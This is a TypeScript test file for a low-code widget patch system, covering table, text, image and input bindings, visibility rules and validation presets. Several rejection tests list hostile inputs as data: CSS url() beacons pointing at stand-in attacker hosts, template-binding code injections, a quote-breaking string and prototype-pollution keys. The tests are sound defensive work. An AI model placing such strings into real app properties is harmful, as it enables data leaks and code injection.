import { z } from "zod";
import type { WidgetNode } from "./layout.js";
import {
  applyWidgetPatch,
  LITERAL_PROP_OWNERS,
  widgetPatchSchema,
  widgetPropsPatchSchema,
} from "./editPatch.js";
import {
  compileInputValidation,
  INPUT_VALIDATION_FORMATS,
  type InputValidationFormat,
} from "./schema.js";

function node(
  overrides: Partial<WidgetNode> &
    Pick<WidgetNode, "widgetId" | "widgetName" | "type">,
): WidgetNode {
  return {
    topRow: 0,
    bottomRow: 4,
    leftColumn: 0,
    rightColumn: 24,
    ...overrides,
  };
}

function page(): WidgetNode {
  const text = node({
    widgetId: "text",
    widgetName: "Greeting",
    type: "TEXT_WIDGET",
    text: "Hello",
  });
  const innerCanvas = node({
    widgetId: "detailsCanvas",
    widgetName: "DetailsCanvas",
    type: "CANVAS_WIDGET",
    children: [],
  });
  const container = node({
    widgetId: "details",
    widgetName: "Details",
    type: "CONTAINER_WIDGET",
    children: [innerCanvas],
  });

  return node({
    widgetId: "0",
    widgetName: "MainContainer",
    type: "CANVAS_WIDGET",
    children: [text, container],
  });
}

describe("applyWidgetPatch", () => {
  it("updates only allowlisted literal properties and returns semantic details", () => {
    const original = page();
    const { changes, dsl } = applyWidgetPatch(original, {
      operations: [
        {
          kind: "update",
          name: "Greeting",
          props: { text: "Welcome", isVisible: false },
        },
      ],
    });
    const greeting = dsl.children![0];

    expect(greeting).toMatchObject({ text: "Welcome", isVisible: false });
    expect(original.children?.[0]).toMatchObject({ text: "Hello" });
    expect(changes).toEqual([
      {
        kind: "update",
        widgetName: "Greeting",
        changedProps: ["text", "isVisible"],
      },
    ]);
  });

  it("sets literal table row-striping colors (oddRowColor/evenRowColor)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );
    const { changes, dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: { oddRowColor: "#ffffff", evenRowColor: "#e6f2ff" },
        },
      ],
    });
    const table = dsl.children![2];

    expect(table).toMatchObject({
      oddRowColor: "#ffffff",
      evenRowColor: "#e6f2ff",
    });
    // Literal style props are NOT dynamic bindings.
    expect(table.dynamicBindingPathList).toBeUndefined();
    expect(changes[0].changedProps).toEqual(["oddRowColor", "evenRowColor"]);
  });

  it("sets a text widget's badge colors (textColor/backgroundColor) as literals", () => {
    const { changes, dsl } = applyWidgetPatch(page(), {
      operations: [
        {
          kind: "update",
          name: "Greeting",
          props: { textColor: "#ffffff", backgroundColor: "#16a34a" },
        },
      ],
    });
    const greeting = dsl.children![0];

    expect(greeting).toMatchObject({
      textColor: "#ffffff",
      backgroundColor: "#16a34a",
    });
    // Literal style props are not dynamic bindings.
    expect(greeting.dynamicBindingPathList).toBeUndefined();
    expect(changes[0].changedProps).toEqual(["textColor", "backgroundColor"]);
  });

  it("rejects a badge color that is not a literal color grammar", () => {
    for (const backgroundColor of [
      "url(https://evil.example/x)",
      "{{ Evil.value }}",
      "red; background: url(x)",
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Greeting", props: { backgroundColor } },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("toggles table interactivity props (search/filter/sort/pagination)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );
    const { dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: {
            isVisibleSearch: true,
            enableClientSideSearch: true,
            isVisibleFilters: true,
            isSortable: true,
          },
        },
      ],
    });

    expect(dsl.children![2]).toMatchObject({
      isVisibleSearch: true,
      enableClientSideSearch: true,
      isVisibleFilters: true,
      isSortable: true,
    });
  });

  it("binds an image's src to a table's selected row (imageSource)", () => {
    const withImage = page();

    withImage.children!.push(
      node({ widgetId: "t1", widgetName: "People", type: "TABLE_WIDGET_V2" }),
      node({ widgetId: "img1", widgetName: "Photo", type: "IMAGE_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withImage, {
      operations: [
        {
          kind: "update",
          name: "Photo",
          props: { imageSource: { table: "People", column: "photo" } },
        },
      ],
    });
    const image = dsl.children![3];

    expect(image.image).toBe('{{ People.selectedRow["photo"] }}');
    expect(image.dynamicBindingPathList).toEqual([{ key: "image" }]);
  });

  it("binds a text's content and an image's src to a query response field via patch", () => {
    const withBoth = page();

    withBoth.children!.push(
      node({ widgetId: "txt1", widgetName: "Temp", type: "TEXT_WIDGET" }),
      node({ widgetId: "img1", widgetName: "Photo", type: "IMAGE_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withBoth, {
      operations: [
        {
          kind: "update",
          name: "Temp",
          props: { source: { query: "getWeather", field: "current.temp" } },
        },
        {
          kind: "update",
          name: "Photo",
          props: { imageSource: { query: "getProfile", field: "avatarUrl" } },
        },
      ],
    });
    const text = dsl.children!.find((w) => w.widgetName === "Temp")!;
    const image = dsl.children!.find((w) => w.widgetName === "Photo")!;

    expect(text.text).toBe('{{ getWeather.data?.current.temp ?? "" }}');
    expect(text.dynamicBindingPathList).toEqual([{ key: "text" }]);
    expect(image.image).toBe('{{ getProfile.data?.avatarUrl ?? "" }}');
    expect(image.dynamicBindingPathList).toEqual([{ key: "image" }]);
  });

  it("patches a computed value onto a text widget and rejects it elsewhere", () => {
    const withText = page();

    withText.children!.push(
      node({ widgetId: "txt1", widgetName: "Today", type: "TEXT_WIDGET" }),
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );
    const { dsl } = applyWidgetPatch(withText, {
      operations: [
        {
          kind: "update",
          name: "Today",
          props: { value: { now: { format: "dayOfWeek" } } },
        },
      ],
    });
    const today = dsl.children!.find((w) => w.widgetName === "Today")!;

    expect(today.text).toBe("{{ moment().format('dddd') }}");
    expect(today.dynamicBindingPathList).toEqual([{ key: "text" }]);

    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Results",
            props: { value: { now: { format: "dayOfWeek" } } },
          },
        ],
      }),
    ).toThrow(/can only be set on a TEXT_WIDGET/);

    // Ambiguous combinations in one update are rejected — both the literal and the source variant.
    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Today",
            props: { text: "static", value: { now: { format: "date" } } },
          },
        ],
      }),
    ).toThrow(/cannot set both/);

    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Today",
            props: {
              source: { query: "getDay" },
              value: { now: { format: "date" } },
            },
          },
        ],
      }),
    ).toThrow(/cannot set both/);
  });

  it("patches a formula value and guards its selected-row refs like concat", () => {
    const withText = page();

    withText.children!.push(
      node({ widgetId: "txt1", widgetName: "Calc", type: "TEXT_WIDGET" }),
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
    );
    const { dsl } = applyWidgetPatch(withText, {
      operations: [
        {
          kind: "update",
          name: "Calc",
          props: {
            value: {
              formula: {
                op: "div",
                args: [{ table: "Users", column: "amount" }, 2],
              },
            },
          },
        },
      ],
    });
    const calc = dsl.children!.find((w) => w.widgetName === "Calc")!;

    expect(calc.text).toBe(
      '{{ ((v) => Number.isFinite(v) ? v : "")((Number(Users.selectedRow["amount"]) / 2)) }}',
    );
    expect(calc.dynamicBindingPathList).toEqual([{ key: "text" }]);

    // Dangling-table guard walks the formula AST, same posture as concat parts.
    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Calc",
            props: {
              value: {
                formula: {
                  op: "abs",
                  args: [{ table: "Missing", column: "x" }],
                },
              },
            },
          },
        ],
      }),
    ).toThrow(/was not found/);
  });

  it("rejects concat selected-row parts referencing a missing or non-table widget", () => {
    const withText = page();

    withText.children!.push(
      node({ widgetId: "txt1", widgetName: "Combo", type: "TEXT_WIDGET" }),
      node({
        widgetId: "i1",
        widgetName: "NotATable",
        type: "INPUT_WIDGET_V2",
      }),
    );

    // Same dangling-table guard as `source` refs: a missing table is caught at patch time, not
    // silently compiled into a blank widget.
    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Combo",
            props: {
              value: {
                concat: [
                  { table: "Missing", column: "first" },
                  { literal: " " },
                ],
              },
            },
          },
        ],
      }),
    ).toThrow(/was not found/);

    expect(() =>
      applyWidgetPatch(withText, {
        operations: [
          {
            kind: "update",
            name: "Combo",
            props: {
              value: {
                concat: [
                  { table: "NotATable", column: "first" },
                  { literal: " " },
                ],
              },
            },
          },
        ],
      }),
    ).toThrow(/is not a table widget/);
  });

  it("patching value over a prior source binding keeps a single dynamic path entry", () => {
    const withText = page();

    withText.children!.push(
      node({ widgetId: "txt1", widgetName: "Temp", type: "TEXT_WIDGET" }),
    );
    const { dsl: bound } = applyWidgetPatch(withText, {
      operations: [
        {
          kind: "update",
          name: "Temp",
          props: { source: { query: "getWeather", field: "temp" } },
        },
      ],
    });
    const { dsl } = applyWidgetPatch(bound, {
      operations: [
        {
          kind: "update",
          name: "Temp",
          props: { value: { now: { format: "time" } } },
        },
      ],
    });
    const text = dsl.children!.find((w) => w.widgetName === "Temp")!;

    expect(text.text).toBe("{{ moment().format('LT') }}");
    expect(text.dynamicBindingPathList).toEqual([{ key: "text" }]);
  });

  it("rejects a query-ref source on a non-text widget", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );

    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Results",
            props: { source: { query: "getUsers" } },
          },
        ],
      }),
    ).toThrow(/can only be set on a TEXT_WIDGET/);
  });

  it("binds whole-response query refs (no field) via patch on text and image", () => {
    const withBoth = page();

    withBoth.children!.push(
      node({ widgetId: "txt1", widgetName: "Day", type: "TEXT_WIDGET" }),
      node({ widgetId: "img1", widgetName: "Pic", type: "IMAGE_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withBoth, {
      operations: [
        {
          kind: "update",
          name: "Day",
          props: { source: { query: "getDay" } },
        },
        {
          kind: "update",
          name: "Pic",
          props: { imageSource: { query: "getPic" } },
        },
      ],
    });

    expect(dsl.children!.find((w) => w.widgetName === "Day")!.text).toBe(
      '{{ getDay.data ?? "" }}',
    );
    expect(dsl.children!.find((w) => w.widgetName === "Pic")!.image).toBe(
      '{{ getPic.data ?? "" }}',
    );
  });

  it("clears the stale dynamic path when a literal text replaces a query-field binding", () => {
    const withText = page();

    withText.children!.push(
      node({ widgetId: "txt1", widgetName: "Temp", type: "TEXT_WIDGET" }),
    );
    const { dsl: bound } = applyWidgetPatch(withText, {
      operations: [
        {
          kind: "update",
          name: "Temp",
          props: { source: { query: "getWeather", field: "temp" } },
        },
      ],
    });
    const { dsl } = applyWidgetPatch(bound, {
      operations: [
        { kind: "update", name: "Temp", props: { text: "static again" } },
      ],
    });
    const text = dsl.children!.find((w) => w.widgetName === "Temp")!;

    expect(text.text).toBe("static again");
    expect(text.dynamicBindingPathList).toEqual([]);
  });

  it("rejects a mixed selected-row/query ref object", () => {
    expect(
      widgetPatchSchema.safeParse({
        operations: [
          {
            kind: "update",
            name: "Temp",
            props: {
              source: { table: "Users", column: "email", query: "getUsers" },
            },
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("clears the stale dynamic path when a literal image replaces an imageSource binding", () => {
    const withImage = page();

    withImage.children!.push(
      node({ widgetId: "t1", widgetName: "People", type: "TABLE_WIDGET_V2" }),
      node({ widgetId: "img1", widgetName: "Photo", type: "IMAGE_WIDGET" }),
    );

    const bound = applyWidgetPatch(withImage, {
      operations: [
        {
          kind: "update",
          name: "Photo",
          props: { imageSource: { table: "People", column: "photo" } },
        },
      ],
    });
    const { dsl } = applyWidgetPatch(bound.dsl, {
      operations: [
        {
          kind: "update",
          name: "Photo",
          props: { image: "https://x/y.png" },
        },
      ],
    });
    const image = dsl.children![3];

    expect(image.image).toBe("https://x/y.png");
    expect(image.dynamicBindingPathList).toEqual([]);
  });

  it("rejects imageSource on a non-image, and a literal image alongside it", () => {
    const withImage = page();

    withImage.children!.push(
      node({ widgetId: "t1", widgetName: "People", type: "TABLE_WIDGET_V2" }),
      node({ widgetId: "img1", widgetName: "Photo", type: "IMAGE_WIDGET" }),
    );

    // imageSource only applies to image widgets.
    expect(() =>
      applyWidgetPatch(withImage, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { imageSource: { table: "People", column: "photo" } },
          },
        ],
      }),
    ).toThrow(/can only be set on a IMAGE_WIDGET/);

    // A literal image and an imageSource binding in one update is ambiguous.
    expect(() =>
      applyWidgetPatch(withImage, {
        operations: [
          {
            kind: "update",
            name: "Photo",
            props: {
              image: "https://x/y.png",
              imageSource: { table: "People", column: "photo" },
            },
          },
        ],
      }),
    ).toThrow(/cannot set both 'image' and 'imageSource'/);
  });

  it("gates visibility on a table's row selection (visibleWhen rowSelected)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
      node({ widgetId: "b1", widgetName: "EditBtn", type: "BUTTON_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "EditBtn",
          props: { visibleWhen: { rowSelected: "Users" } },
        },
      ],
    });
    const button = dsl.children!.find((w) => w.widgetName === "EditBtn")!;

    expect(button.isVisible).toBe("{{ Users.selectedRowIndex !== -1 }}");
    expect(button.dynamicBindingPathList).toEqual([{ key: "isVisible" }]);

    // Dangling or wrong-type targets reject, same posture as the control form.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "EditBtn",
            props: { visibleWhen: { rowSelected: "Missing" } },
          },
        ],
      }),
    ).toThrow(/was not found/);

    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "EditBtn",
            props: { visibleWhen: { rowSelected: "EditBtn" } },
          },
        ],
      }),
    ).toThrow(/is not a table widget/);
  });

  it("gates visibility on an input holding text (visibleWhen notEmpty)", () => {
    const withInput = page();

    withInput.children!.push(
      node({ widgetId: "i1", widgetName: "Search", type: "INPUT_WIDGET_V2" }),
      node({ widgetId: "b1", widgetName: "GoBtn", type: "BUTTON_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withInput, {
      operations: [
        {
          kind: "update",
          name: "GoBtn",
          props: { visibleWhen: { notEmpty: "Search" } },
        },
      ],
    });
    const button = dsl.children!.find((w) => w.widgetName === "GoBtn")!;

    expect(button.isVisible).toBe("{{ !!Search.text }}");
    expect(button.dynamicBindingPathList).toEqual([{ key: "isVisible" }]);

    expect(() =>
      applyWidgetPatch(withInput, {
        operations: [
          {
            kind: "update",
            name: "GoBtn",
            props: { visibleWhen: { notEmpty: "GoBtn" } },
          },
        ],
      }),
    ).toThrow(/must be an input widget/);
  });

  it("gates a widget's visibility on a select control's value (visibleWhen)", () => {
    const withToggle = page();

    withToggle.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
      node({ widgetId: "s1", widgetName: "ViewToggle", type: "SELECT_WIDGET" }),
    );
    const { dsl } = applyWidgetPatch(withToggle, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: { visibleWhen: { control: "ViewToggle", equals: "Table" } },
        },
      ],
    });
    const table = dsl.children![2];

    expect(table.isVisible).toBe(
      "{{ ViewToggle.selectedOptionValue === 'Table' }}",
    );
    expect(table.dynamicBindingPathList).toEqual([{ key: "isVisible" }]);
  });

  it("uses selectedTab for a tabs control, and rejects a non-control or literal-isVisible clash", () => {
    const withTabs = page();

    withTabs.children!.push(
      node({ widgetId: "c1", widgetName: "Cards", type: "LIST_WIDGET_V2" }),
      node({ widgetId: "tb", widgetName: "ViewTabs", type: "TABS_WIDGET" }),
    );

    const { dsl } = applyWidgetPatch(withTabs, {
      operations: [
        {
          kind: "update",
          name: "Cards",
          props: { visibleWhen: { control: "ViewTabs", equals: "Cards" } },
        },
      ],
    });

    expect(dsl.children![2].isVisible).toBe(
      "{{ ViewTabs.selectedTab === 'Cards' }}",
    );

    // A non-control target is rejected.
    expect(() =>
      applyWidgetPatch(withTabs, {
        operations: [
          {
            kind: "update",
            name: "Cards",
            props: { visibleWhen: { control: "Greeting", equals: "x" } },
          },
        ],
      }),
    ).toThrow(/must be a select or tabs control/);

    // A literal isVisible alongside visibleWhen is ambiguous.
    expect(() =>
      applyWidgetPatch(withTabs, {
        operations: [
          {
            kind: "update",
            name: "Cards",
            props: {
              isVisible: true,
              visibleWhen: { control: "ViewTabs", equals: "Cards" },
            },
          },
        ],
      }),
    ).toThrow(/cannot set both 'isVisible' and 'visibleWhen'/);
  });

  it("supports dotted/hyphenated control values and clears the binding when a literal isVisible replaces it", () => {
    const withToggle = page();

    withToggle.children!.push(
      node({ widgetId: "t1", widgetName: "Panel", type: "CONTAINER_WIDGET" }),
      node({ widgetId: "s1", widgetName: "ViewToggle", type: "SELECT_WIDGET" }),
    );

    const bound = applyWidgetPatch(withToggle, {
      operations: [
        {
          kind: "update",
          name: "Panel",
          props: {
            visibleWhen: { control: "ViewToggle", equals: "Grid-View.2" },
          },
        },
      ],
    });

    expect(bound.dsl.children![2].isVisible).toBe(
      "{{ ViewToggle.selectedOptionValue === 'Grid-View.2' }}",
    );
    expect(bound.dsl.children![2].dynamicBindingPathList).toEqual([
      { key: "isVisible" },
    ]);

    // A later literal isVisible clears the dynamic-path registration.
    const { dsl } = applyWidgetPatch(bound.dsl, {
      operations: [
        { kind: "update", name: "Panel", props: { isVisible: true } },
      ],
    });

    expect(dsl.children![2].isVisible).toBe(true);
    expect(dsl.children![2].dynamicBindingPathList).toEqual([]);
  });

  it("rejects a visibleWhen value carrying quote/binding characters at the schema", () => {
    for (const equals of ["Table' || evil('", "{{ evil() }}", 'a"b']) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            {
              kind: "update",
              name: "Results",
              props: { visibleWhen: { control: "ViewToggle", equals } },
            },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("re-binds a table's data with a clear-when-empty guard", () => {
    const withWidgets = page();

    withWidgets.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
      node({
        widgetId: "in1",
        widgetName: "ZipInput",
        type: "INPUT_WIDGET_V2",
      }),
    );
    const { changes, dsl } = applyWidgetPatch(withWidgets, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: {
            tableData: {
              query: "lookupZip",
              field: "places",
              clearWhenEmpty: "ZipInput",
            },
          },
        },
      ],
    });
    const table = dsl.children![2];

    expect(table.tableData).toBe(
      "{{ ZipInput.text ? (lookupZip.data?.places ?? []) : [] }}",
    );
    expect(table.dynamicBindingPathList).toEqual([{ key: "tableData" }]);
    expect(changes[0].changedProps).toEqual(["tableData"]);
  });

  it("re-binds a table's data without a guard (plain binding)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );
    const { dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: { tableData: { query: "getRows" } },
        },
      ],
    });

    expect(dsl.children![2].tableData).toBe("{{ getRows.data ?? [] }}");
  });

  it("rejects a tableData binding on a non-table, or a missing guard input", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );

    // tableData only applies to tables.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { tableData: { query: "getRows" } },
          },
        ],
      }),
    ).toThrow(/can only be set on a TABLE_WIDGET_V2/);

    // The guard input must exist.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Results",
            props: { tableData: { query: "getRows", clearWhenEmpty: "Nope" } },
          },
        ],
      }),
    ).toThrow(/clearWhenEmpty input "Nope" was not found/);
  });

  it("re-binds a table's data with a guard but no field", () => {
    const withWidgets = page();

    withWidgets.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
      node({
        widgetId: "in1",
        widgetName: "Search",
        type: "INPUT_WIDGET_V2",
      }),
    );
    const { dsl } = applyWidgetPatch(withWidgets, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: { tableData: { query: "getRows", clearWhenEmpty: "Search" } },
        },
      ],
    });

    expect(dsl.children![2].tableData).toBe(
      "{{ Search.text ? (getRows.data ?? []) : [] }}",
    );
  });

  it("re-binds a table's data to a store key (M5 store accumulation)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );
    const { changes, dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Results",
          props: { tableData: { store: "zipResults" } },
        },
      ],
    });
    const table = dsl.children![2];

    expect(table.tableData).toBe("{{ appsmith.store.zipResults ?? [] }}");
    expect(table.dynamicBindingPathList).toEqual([{ key: "tableData" }]);
    expect(changes[0].changedProps).toEqual(["tableData"]);
  });

  it("rejects a store tableData binding on a non-table, a bad store key, or mixed forms", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );

    // Store form is table-only, like the query form.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { tableData: { store: "zipResults" } },
          },
        ],
      }),
    ).toThrow(/can only be set on a TABLE_WIDGET_V2/);

    // Prototype-polluting and digit-leading keys are rejected by the schema.
    for (const badKey of ["__proto__", "constructor", "prototype", "1abc"]) {
      expect(() =>
        applyWidgetPatch(withTable, {
          operations: [
            {
              kind: "update",
              name: "Results",
              props: { tableData: { store: badKey } },
            },
          ],
        }),
      ).toThrow();
    }

    // The union arms are strict: store cannot be mixed with query-form props.
    expect(() =>
      applyWidgetPatch(withTable, {
        operations: [
          {
            kind: "update",
            name: "Results",
            props: {
              tableData: { store: "zipResults", clearWhenEmpty: "ZipInput" },
            },
          },
        ],
      }),
    ).toThrow();
  });

  it("rejects a clearWhenEmpty guard that is not an input widget", () => {
    const withWidgets = page();

    withWidgets.children!.push(
      node({ widgetId: "t1", widgetName: "Results", type: "TABLE_WIDGET_V2" }),
    );

    // "Greeting" is a TEXT_WIDGET — it has no `.text` value to gate on.
    expect(() =>
      applyWidgetPatch(withWidgets, {
        operations: [
          {
            kind: "update",
            name: "Results",
            props: {
              tableData: { query: "getRows", clearWhenEmpty: "Greeting" },
            },
          },
        ],
      }),
    ).toThrow(/must be an input widget/);
  });

  it("adds named-format validation to an input (regex + errorMessage + required)", () => {
    const withInput = page();

    withInput.children!.push(
      node({
        widgetId: "in1",
        widgetName: "ZipInput",
        type: "INPUT_WIDGET_V2",
      }),
    );
    const { changes, dsl } = applyWidgetPatch(withInput, {
      operations: [
        {
          kind: "update",
          name: "ZipInput",
          props: { validation: { format: "zipcode" } },
        },
      ],
    });
    const input = dsl.children![2];

    expect(input.regex).toBe("^\\d{5}$");
    expect(input.errorMessage).toBe("Please enter a 5-digit zip code");
    expect(input.isRequired).toBe(true);
    expect(changes[0].changedProps).toEqual(["validation"]);
  });

  it("lets the caller override the validation error message", () => {
    const withInput = page();

    withInput.children!.push(
      node({
        widgetId: "in1",
        widgetName: "ZipInput",
        type: "INPUT_WIDGET_V2",
      }),
    );
    const { dsl } = applyWidgetPatch(withInput, {
      operations: [
        {
          kind: "update",
          name: "ZipInput",
          props: {
            validation: { format: "zipcode", message: "5 digits only" },
          },
        },
      ],
    });

    expect(dsl.children![2].errorMessage).toBe("5 digits only");
  });

  it("compiles a vetted, binding-free regex + message for every named format", () => {
    const RAW_EXPRESSION = /\{\{|\}\}|\$\{|`/;

    for (const format of Object.keys(
      INPUT_VALIDATION_FORMATS,
    ) as InputValidationFormat[]) {
      const { errorMessage, regex } = compileInputValidation({ format });

      // The compiled regex is exactly the vetted preset and carries no Appsmith binding syntax (regex is a
      // bind-evaluated prop, so a `{{ }}` in it would be an injection).
      expect(regex).toBe(INPUT_VALIDATION_FORMATS[format].regex);
      expect(RAW_EXPRESSION.test(regex)).toBe(false);
      expect(errorMessage).toBe(INPUT_VALIDATION_FORMATS[format].message);
      // Each regex compiles to a real RegExp.
      expect(() => new RegExp(regex)).not.toThrow();
    }

    // Spot-check the exact patterns so a typo in any preset is caught.
    expect(compileInputValidation({ format: "email" }).regex).toBe(
      "^[^\\s@]{1,64}@[^\\s@]{1,255}\\.[^\\s@]{1,63}$",
    );
    expect(compileInputValidation({ format: "usPhone" }).regex).toBe(
      "^\\d{10}$",
    );
    expect(compileInputValidation({ format: "integer" }).regex).toBe(
      "^-?\\d+$",
    );
  });

  it("rejects validation on a non-input widget", () => {
    expect(() =>
      applyWidgetPatch(page(), {
        operations: [
          {
            kind: "update",
            name: "Greeting",
            props: { validation: { format: "zipcode" } },
          },
        ],
      }),
    ).toThrow(/can only be set on an INPUT_WIDGET_V2/);
  });

  it("disables a button while a named input is invalid", () => {
    const withWidgets = page();

    withWidgets.children!.push(
      node({
        widgetId: "in1",
        widgetName: "ZipInput",
        type: "INPUT_WIDGET_V2",
      }),
      node({
        widgetId: "b1",
        widgetName: "LookupButton",
        type: "BUTTON_WIDGET",
      }),
    );
    const { dsl } = applyWidgetPatch(withWidgets, {
      operations: [
        {
          kind: "update",
          name: "LookupButton",
          props: { disableWhenInvalid: "ZipInput" },
        },
      ],
    });
    const button = dsl.children![3];

    expect(button.isDisabled).toBe("{{ !ZipInput.isValid }}");
    expect(button.dynamicBindingPathList).toEqual([{ key: "isDisabled" }]);
  });

  it("rejects disableWhenInvalid on a missing or non-input widget, or with a literal isDisabled", () => {
    const withButton = page();

    withButton.children!.push(
      node({
        widgetId: "b1",
        widgetName: "LookupButton",
        type: "BUTTON_WIDGET",
      }),
    );

    // Missing input.
    expect(() =>
      applyWidgetPatch(withButton, {
        operations: [
          {
            kind: "update",
            name: "LookupButton",
            props: { disableWhenInvalid: "Nope" },
          },
        ],
      }),
    ).toThrow(/disableWhenInvalid input "Nope" was not found/);

    // Non-input (Greeting is a TEXT_WIDGET).
    expect(() =>
      applyWidgetPatch(withButton, {
        operations: [
          {
            kind: "update",
            name: "LookupButton",
            props: { disableWhenInvalid: "Greeting" },
          },
        ],
      }),
    ).toThrow(/must be an input widget/);

    // Ambiguous: literal isDisabled AND disableWhenInvalid.
    expect(() =>
      applyWidgetPatch(withButton, {
        operations: [
          {
            kind: "update",
            name: "LookupButton",
            props: { isDisabled: false, disableWhenInvalid: "LookupButton" },
          },
        ],
      }),
    ).toThrow(/cannot set both 'isDisabled' and 'disableWhenInvalid'/);
  });

  it("rejects an unknown validation format at the schema", () => {
    expect(
      widgetPatchSchema.safeParse({
        operations: [
          {
            kind: "update",
            name: "ZipInput",
            props: { validation: { format: "ssn" } },
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("rejects a validation message that carries binding/template syntax", () => {
    for (const message of ["{{ evil() }}", "bad ${x}", "back`tick"]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            {
              kind: "update",
              name: "ZipInput",
              props: { validation: { format: "zipcode", message } },
            },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("rejects setting a literal isRequired alongside validation (would defeat the guard)", () => {
    const withInput = page();

    withInput.children!.push(
      node({
        widgetId: "in1",
        widgetName: "ZipInput",
        type: "INPUT_WIDGET_V2",
      }),
    );

    expect(() =>
      applyWidgetPatch(withInput, {
        operations: [
          {
            kind: "update",
            name: "ZipInput",
            props: { validation: { format: "zipcode" }, isRequired: false },
          },
        ],
      }),
    ).toThrow(/cannot set both 'isRequired' and 'validation'/);
  });

  it("rejects a binding/template/egress smuggled through a row color", () => {
    // Bindings/templates, AND a CSS url() egress primitive (tracking beacon / internal probe), rejected on both
    // odd and even row colors.
    const bad = [
      "{{ evil() }}",
      "${x}",
      "red`",
      "url(//attacker.example/beacon)",
      "url(/x)",
    ];

    for (const color of bad) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Results", props: { evenRowColor: color } },
          ],
        }).success,
      ).toBe(false);
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Results", props: { oddRowColor: color } },
          ],
        }).success,
      ).toBe(false);
    }
  });

  it("accepts legitimate literal color forms for row striping", () => {
    for (const color of [
      "#fff",
      "#e6f2ff",
      "rgb(230, 242, 255)",
      "rgba(0,0,0,0.5)",
      "hsl(210, 100%, 96%)",
      "lightblue",
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [
            { kind: "update", name: "Results", props: { evenRowColor: color } },
          ],
        }).success,
      ).toBe(true);
    }
  });

  it("compiles a selected-row binding onto a text widget (source)", () => {
    const withTable = page();

    withTable.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
    );
    const { changes, dsl } = applyWidgetPatch(withTable, {
      operations: [
        {
          kind: "update",
          name: "Greeting",
          props: { source: { table: "Users", column: "email" } },
        },
      ],
    });
    const greeting = dsl.children![0];

    expect(greeting.text).toBe('{{ Users.selectedRow["email"] }}');
    expect(greeting.dynamicBindingPathList).toEqual([{ key: "text" }]);
    expect(changes[0].changedProps).toEqual(["source"]);
  });

  it("compiles a selected-row prefill onto an input widget (defaultValue)", () => {
    const withInput = page();

    withInput.children!.push(
      node({ widgetId: "t1", widgetName: "Users", type: "TABLE_WIDGET_V2" }),
      node({
        widgetId: "in1",
        widgetName: "EmailInput",
        type: "INPUT_WIDGET_V2",
        dynamicBindingPathList: [{ key: "defaultText" }],
      }),
    );
